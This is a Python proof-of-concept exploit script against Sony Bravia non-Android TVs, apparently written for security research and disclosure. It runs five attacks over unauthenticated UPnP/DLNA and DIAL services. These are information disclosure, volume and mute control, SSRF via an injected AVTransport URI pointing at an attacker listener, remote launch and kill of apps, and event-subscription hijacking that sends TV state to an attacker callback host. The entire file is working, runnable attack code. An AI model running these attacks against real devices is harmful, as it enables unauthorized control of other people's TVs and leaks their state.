#!/usr/bin/env python3
"""
Sony Bravia Non-Android — End-to-End PoC (All 5 Zero-Days)
============================================================

Demonstrates all 5 vulnerabilities against Sony Bravia TVs with IPI/ACCESS
middleware exposing unauthenticated UPnP/DLNA on port 2870 and DIAL on 56789.

Tested on: KDL-50W665F, firmware v7.631-4.000-0106 (2026-04-20)

Requirements: Python 3.8+, requests library (pip install requests)

Usage:
  python e2e_poc_bravia_upnp.py --target <TV_IP> [--attacker <YOUR_IP>] [--port 9999]

Author: Andre Henrique (@mrhenrike) | Uniao Geek — https://github.com/Uniao-Geek
License: For authorized security research and responsible disclosure only.

BRAVIA-2026-001: Unauthenticated Information Disclosure (CWE-306)
BRAVIA-2026-002: Unauthorized Volume/Mute Control      (CWE-306)
BRAVIA-2026-003: SSRF + Content Injection via AVTransport (CWE-918, CWE-306)
BRAVIA-2026-004: Unauthenticated DIAL App Launch/Kill   (CWE-306)
BRAVIA-2026-005: EventSub Hijack — State Exfiltration   (CWE-306, CWE-200)
"""

import argparse
import datetime
import http.server
import json
import os
import re
import socket
import socketserver
import sys
import threading
import time

try:
    import requests
except ImportError:
    print("ERROR: 'requests' library required. Install: pip install requests")
    sys.exit(1)


UPNP_PORT = 2870
DIAL_PORT = 56789
RC  = "urn:schemas-upnp-org:service:RenderingControl:1"
AVT = "urn:schemas-upnp-org:service:AVTransport:1"
CM  = "urn:schemas-upnp-org:service:ConnectionManager:1"


def soap(target, svc, action, inner_xml, control_path):
    """Send a UPnP SOAP request. Returns (status_code, response_text)."""
    envelope = (
        '<?xml version="1.0" encoding="utf-8"?>'
        '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"'
        ' s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
        f'<s:Body><u:{action} xmlns:u="{svc}">{inner_xml}'
        f'</u:{action}></s:Body></s:Envelope>'
    )
    headers = {
        "Content-Type": 'text/xml; charset="utf-8"',
        "SOAPACTION": f'"{svc}#{action}"',
    }
    url = f"http://{target}:{UPNP_PORT}/{control_path}"
    r = requests.post(url, data=envelope.encode("utf-8"),
                      headers=headers, timeout=8)
    return r.status_code, r.text


def extract_xml(text, tag):
    """Extract value from <tag>value</tag>."""
    m = re.search(rf"<{tag}>([^<]*)</{tag}>", text)
    return m.group(1) if m else None


# ─── VULN 1: Information Disclosure ──────────────────────────────────────

def test_vuln1_info_disclosure(target):
    print("\n" + "=" * 60)
    print("[BRAVIA-2026-001] Unauthenticated Information Disclosure")
    print("  CWE-306 | CVSSv3.1: 5.3 MEDIUM")
    print("=" * 60)
    results = {}

    actions = [
        (RC,  "GetVolume",   "<InstanceID>0</InstanceID><Channel>Master</Channel>",
         "control/RenderingControl", "CurrentVolume"),
        (RC,  "GetMute",     "<InstanceID>0</InstanceID><Channel>Master</Channel>",
         "control/RenderingControl", "CurrentMute"),
        (RC,  "ListPresets", "<InstanceID>0</InstanceID>",
         "control/RenderingControl", "CurrentPresetNameList"),
        (AVT, "GetTransportInfo", "<InstanceID>0</InstanceID>",
         "control/AVTransport", "CurrentTransportState"),
        (AVT, "GetMediaInfo", "<InstanceID>0</InstanceID>",
         "control/AVTransport", "CurrentURI"),
        (AVT, "GetDeviceCapabilities", "<InstanceID>0</InstanceID>",
         "control/AVTransport", "PlayMedia"),
        (CM,  "GetCurrentConnectionIDs", "",
         "control/ConnectionManager", "ConnectionIDs"),
    ]

    for svc, action, xml, path, key_field in actions:
        code, text = soap(target, svc, action, xml, path)
        value = extract_xml(text, key_field)
        status = "VULN" if code == 200 else "SAFE"
        results[action] = {"http": code, key_field: value}
        print(f"  [{status}] {action}: HTTP {code} -> {key_field}={value}")

    return results


# ─── VULN 2: Unauthorized Volume/Mute Control ───────────────────────────

def test_vuln2_volume_control(target):
    print("\n" + "=" * 60)
    print("[BRAVIA-2026-002] Unauthorized Volume/Mute Control")
    print("  CWE-306 | CVSSv3.1: 5.4 MEDIUM")
    print("=" * 60)
    results = {}

    # Read current volume
    code, text = soap(target, RC, "GetVolume",
                      "<InstanceID>0</InstanceID><Channel>Master</Channel>",
                      "control/RenderingControl")
    orig_vol = int(extract_xml(text, "CurrentVolume") or 5)
    print(f"  [READ] Current volume: {orig_vol}")

    # Set volume to 1
    code, _ = soap(target, RC, "SetVolume",
                   "<InstanceID>0</InstanceID><Channel>Master</Channel>"
                   "<DesiredVolume>1</DesiredVolume>",
                   "control/RenderingControl")
    results["SetVolume_1"] = code
    print(f"  [WRITE] SetVolume(1): HTTP {code}")

    # Mute
    code, _ = soap(target, RC, "SetMute",
                   "<InstanceID>0</InstanceID><Channel>Master</Channel>"
                   "<DesiredMute>1</DesiredMute>",
                   "control/RenderingControl")
    results["SetMute_on"] = code
    print(f"  [WRITE] SetMute(on): HTTP {code}")

    # Unmute
    code, _ = soap(target, RC, "SetMute",
                   "<InstanceID>0</InstanceID><Channel>Master</Channel>"
                   "<DesiredMute>0</DesiredMute>",
                   "control/RenderingControl")
    results["SetMute_off"] = code
    print(f"  [WRITE] SetMute(off): HTTP {code}")

    # Restore
    code, _ = soap(target, RC, "SetVolume",
                   f"<InstanceID>0</InstanceID><Channel>Master</Channel>"
                   f"<DesiredVolume>{orig_vol}</DesiredVolume>",
                   "control/RenderingControl")
    results["restore"] = code
    print(f"  [RESTORE] Volume->{orig_vol}: HTTP {code}")

    vuln = all(v == 200 for v in results.values())
    print(f"\n  Result: {'VULNERABLE' if vuln else 'NOT VULNERABLE'}")
    return results


# ─── VULN 3: SSRF + Content Injection ───────────────────────────────────

SSRF_HITS = []

class SSRFHandler(http.server.BaseHTTPRequestHandler):
    def do_HEAD(self):
        SSRF_HITS.append({
            "time": datetime.datetime.now(datetime.timezone.utc).isoformat(),
            "method": "HEAD", "path": self.path,
            "peer": self.client_address[0],
            "ua": self.headers.get("User-Agent", ""),
        })
        self.send_response(200)
        self.send_header("Content-Type", "image/jpeg")
        self.send_header("Content-Length", "0")
        self.end_headers()

    def do_GET(self):
        SSRF_HITS.append({
            "time": datetime.datetime.now(datetime.timezone.utc).isoformat(),
            "method": "GET", "path": self.path,
            "peer": self.client_address[0],
            "ua": self.headers.get("User-Agent", ""),
        })
        body = b"SSRF Confirmed\n"
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args):
        pass


def test_vuln3_ssrf(target, attacker_ip, listen_port):
    print("\n" + "=" * 60)
    print("[BRAVIA-2026-003] SSRF + Content Injection via AVTransport")
    print("  CWE-918, CWE-306 | CVSSv3.1: 8.1 HIGH")
    print("=" * 60)

    SSRF_HITS.clear()
    srv = socketserver.TCPServer(("", listen_port), SSRFHandler)
    srv.allow_reuse_address = True
    threading.Thread(target=srv.serve_forever, daemon=True).start()

    inject_uri = f"http://{attacker_ip}:{listen_port}/ssrf_poc"
    print(f"  [*] Listener: {attacker_ip}:{listen_port}")
    print(f"  [*] Injecting URI: {inject_uri}")

    code_set, _ = soap(target, AVT, "SetAVTransportURI",
                       f"<InstanceID>0</InstanceID>"
                       f"<CurrentURI>{inject_uri}</CurrentURI>"
                       "<CurrentURIMetaData></CurrentURIMetaData>",
                       "control/AVTransport")
    print(f"  [INJECT] SetAVTransportURI: HTTP {code_set}")

    code_play, _ = soap(target, AVT, "Play",
                        "<InstanceID>0</InstanceID><Speed>1</Speed>",
                        "control/AVTransport")
    print(f"  [TRIGGER] Play: HTTP {code_play}")

    print("  [*] Waiting 12s for TV callback...")
    deadline = time.time() + 12
    while time.time() < deadline and not SSRF_HITS:
        time.sleep(0.5)

    # Check transport state
    _, text = soap(target, AVT, "GetTransportInfo",
                   "<InstanceID>0</InstanceID>", "control/AVTransport")
    state = extract_xml(text, "CurrentTransportState")
    _, text2 = soap(target, AVT, "GetPositionInfo",
                    "<InstanceID>0</InstanceID>", "control/AVTransport")
    track_uri = extract_xml(text2, "TrackURI")

    srv.shutdown()

    results = {
        "set_uri_http": code_set, "play_http": code_play,
        "transport_state": state, "track_uri": track_uri,
        "ssrf_hits": SSRF_HITS.copy(),
        "ssrf_confirmed": len(SSRF_HITS) > 0,
    }

    if SSRF_HITS:
        print(f"\n  [!!] SSRF CONFIRMED — TV sent {len(SSRF_HITS)} request(s):")
        for h in SSRF_HITS:
            print(f"       {h['method']} {h['path']} from {h['peer']} ua={h['ua']}")
    else:
        print(f"\n  [!] No callback (firewall? check TrackURI={track_uri})")

    print(f"  Transport: {state}")
    return results


# ─── VULN 4: DIAL App Takeover ──────────────────────────────────────────

def test_vuln4_dial(target):
    print("\n" + "=" * 60)
    print("[BRAVIA-2026-004] Unauthenticated DIAL App Launch/Kill")
    print("  CWE-306 | CVSSv3.1: 6.5 MEDIUM")
    print("=" * 60)
    results = {}

    # Check Netflix state
    try:
        r = requests.get(f"http://{target}:{DIAL_PORT}/apps/Netflix", timeout=5)
        state_before = extract_xml(r.text, "state") or "unknown"
        print(f"  [READ] Netflix state: {state_before}")
    except Exception as e:
        print(f"  [SKIP] DIAL port {DIAL_PORT} unreachable: {e}")
        return {"error": "DIAL unreachable"}

    # Launch
    try:
        r = requests.post(f"http://{target}:{DIAL_PORT}/apps/Netflix",
                          data="", headers={"Content-Type": "text/plain"}, timeout=8)
        results["launch_http"] = r.status_code
        print(f"  [LAUNCH] POST /apps/Netflix: HTTP {r.status_code}")
    except Exception as e:
        results["launch_http"] = str(e)

    time.sleep(3)

    # Verify
    try:
        r = requests.get(f"http://{target}:{DIAL_PORT}/apps/Netflix", timeout=5)
        state_after = extract_xml(r.text, "state") or "unknown"
        results["state_after_launch"] = state_after
        print(f"  [VERIFY] Netflix state: {state_after}")
    except Exception:
        state_after = "unknown"

    # Kill
    try:
        r = requests.delete(f"http://{target}:{DIAL_PORT}/apps/Netflix/run", timeout=5)
        results["kill_http"] = r.status_code
        print(f"  [KILL] DELETE /apps/Netflix/run: HTTP {r.status_code}")
    except Exception as e:
        results["kill_http"] = str(e)

    vuln = results.get("launch_http") == 201 or state_after == "running"
    print(f"\n  Result: {'VULNERABLE' if vuln else 'NOT VULNERABLE'}")
    return results


# ─── VULN 5: EventSub Hijack ────────────────────────────────────────────

EVENTSUB_HITS = []

class EventHandler(http.server.BaseHTTPRequestHandler):
    def do_NOTIFY(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode(errors="replace")
        EVENTSUB_HITS.append({
            "time": datetime.datetime.now(datetime.timezone.utc).isoformat(),
            "peer": self.client_address[0],
            "sid": self.headers.get("SID", ""),
            "body_length": length,
            "body_preview": body[:500],
        })
        self.send_response(200)
        self.end_headers()

    def log_message(self, *args):
        pass


def test_vuln5_eventsub(target, attacker_ip, listen_port):
    print("\n" + "=" * 60)
    print("[BRAVIA-2026-005] EventSub Hijack — State Exfiltration")
    print("  CWE-306, CWE-200 | CVSSv3.1: 5.3 MEDIUM")
    print("=" * 60)

    evtsub_port = listen_port + 1
    EVENTSUB_HITS.clear()

    try:
        srv = socketserver.TCPServer(("", evtsub_port), EventHandler)
        srv.allow_reuse_address = True
        threading.Thread(target=srv.serve_forever, daemon=True).start()
    except Exception as e:
        print(f"  [SKIP] Cannot bind port {evtsub_port}: {e}")
        return {"error": str(e)}

    results = {}
    services = [
        ("RenderingControl", "event/RenderingControl"),
        ("AVTransport", "event/AVTransport"),
        ("ConnectionManager", "event/ConnectionManager"),
    ]
    for name, path in services:
        try:
            r = requests.request(
                "SUBSCRIBE", f"http://{target}:{UPNP_PORT}/{path}",
                headers={
                    "NT": "upnp:event",
                    "CALLBACK": f"<http://{attacker_ip}:{evtsub_port}/event>",
                    "TIMEOUT": "Second-300",
                }, timeout=8)
            sid = r.headers.get("SID", "")
            results[name] = {"subscribe_http": r.status_code, "SID": sid}
            print(f"  [SUB] {name}: HTTP {r.status_code}  SID={sid}")
        except Exception as e:
            results[name] = {"error": str(e)}

    print("  [*] Waiting 5s for NOTIFY events...")
    time.sleep(5)
    srv.shutdown()

    results["notify_hits"] = len(EVENTSUB_HITS)
    results["events"] = EVENTSUB_HITS.copy()

    if EVENTSUB_HITS:
        print(f"  [!!] Received {len(EVENTSUB_HITS)} NOTIFY event(s) from TV:")
        for e in EVENTSUB_HITS:
            print(f"       SID={e['sid']}  body={e['body_length']}B")
    else:
        print("  [!] No NOTIFY received")

    return results


# ─── MAIN ────────────────────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser(
        description="Sony Bravia UPnP/DLNA Zero-Day PoC (5 vulns)")
    ap.add_argument("--target", required=True, help="TV IP address")
    ap.add_argument("--attacker", default=None,
                    help="Your IP (same LAN). Auto-detected if omitted.")
    ap.add_argument("--port", type=int, default=9999, help="Listener port")
    ap.add_argument("--skip", nargs="*", default=[],
                    help="Skip vulns: 1 2 3 4 5")
    args = ap.parse_args()

    target = args.target
    attacker = args.attacker
    if not attacker:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect((target, 1))
            attacker = s.getsockname()[0]
        finally:
            s.close()

    print("=" * 60)
    print("Sony Bravia Non-Android — 5 Zero-Day PoC")
    print(f"  Target    : {target}")
    print(f"  Attacker  : {attacker}:{args.port}")
    print(f"  Timestamp : {datetime.datetime.now(datetime.timezone.utc).isoformat()}")
    print("=" * 60)

    evidence = {
        "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        "target": target, "attacker": f"{attacker}:{args.port}",
        "vulns": {},
    }

    if "1" not in args.skip:
        evidence["vulns"]["BRAVIA-2026-001"] = test_vuln1_info_disclosure(target)
    if "2" not in args.skip:
        evidence["vulns"]["BRAVIA-2026-002"] = test_vuln2_volume_control(target)
    if "3" not in args.skip:
        evidence["vulns"]["BRAVIA-2026-003"] = test_vuln3_ssrf(
            target, attacker, args.port)
    if "4" not in args.skip:
        evidence["vulns"]["BRAVIA-2026-004"] = test_vuln4_dial(target)
    if "5" not in args.skip:
        evidence["vulns"]["BRAVIA-2026-005"] = test_vuln5_eventsub(
            target, attacker, args.port)

    out = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                       "e2e_poc_evidence.json")
    with open(out, "w") as f:
        json.dump(evidence, f, indent=2, default=str)

    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    for vid, data in evidence["vulns"].items():
        if isinstance(data, dict) and "error" not in data:
            print(f"  {vid}: TESTED")
        else:
            print(f"  {vid}: {data}")
    print(f"\n  Evidence saved: {out}")


if __name__ == "__main__":
    main()
